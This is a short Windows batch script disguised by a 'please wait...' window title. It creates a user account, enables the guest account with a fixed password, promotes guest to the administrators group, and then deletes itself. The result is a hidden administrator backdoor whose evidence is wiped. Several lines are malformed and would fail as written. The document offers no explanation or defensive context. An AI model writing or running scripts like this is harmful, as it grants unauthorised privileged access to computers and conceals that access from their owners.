echo off
title please wait...
cls
net user add username password/add
net user localgroup administra
tors
username/add
net user  guest 420 /active: yes
net localgroup guests  guest/delete
net localgroup administrators guest/add
del%0